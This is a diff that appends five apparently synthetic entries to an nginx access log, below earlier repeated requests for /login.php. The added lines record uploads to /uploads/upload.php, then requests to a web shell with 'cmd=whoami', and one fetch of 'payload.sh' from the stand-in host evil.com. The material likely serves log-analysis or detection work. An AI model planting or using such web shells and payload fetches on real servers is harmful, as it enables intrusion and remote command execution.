@@ -6967,3 +6967,8 @@ Jan 09 02:34:48	LabSZ	nginx[5469]:	113.160.235.150 - - [2026-01-09 02:34:48.9984
 Jan 09 02:34:50	server	nginx[22022]:	113.160.235.150 - - [2026-01-09 02:34:50.475683] "GET /login.php HTTP/1.1" 200
 Jan 09 02:34:51	RUfus	nginx[4443]:	113.160.235.150 - - [2026-01-09 02:34:51.663099] "GET /login.php HTTP/1.1" 200
 Jan 09 02:34:52	server	nginx[9163]:	113.160.235.150 - - [2026-01-09 02:34:52.235844] "GET /login.php HTTP/1.1" 200
+Mar 26 23:36:00	LabSZ	nginx[13161]:	38.211.193.130 - - [2026-03-26 23:36:00.369674] "POST /uploads/upload.php HTTP/1.1" 200
+Mar 26 23:36:01	RUfus	nginx[1927]:	38.211.193.130 - - [2026-03-26 23:36:01.094799] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200
+Mar 26 23:40:26	prod1	nginx[7550]:	110.39.166.75 - - [2026-03-26 23:40:26.129845] "POST /uploads/upload.php HTTP/1.1" 200
+Mar 26 23:40:27	prod1	nginx[11759]:	110.39.166.75 - - [2026-03-26 23:40:27.437003] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200
+Mar 26 23:41:09	testvm	nginx[24185]:	31.58.87.34 - - [2026-03-26 23:41:09.524605] "GET http://evil.com/payload.sh" 200
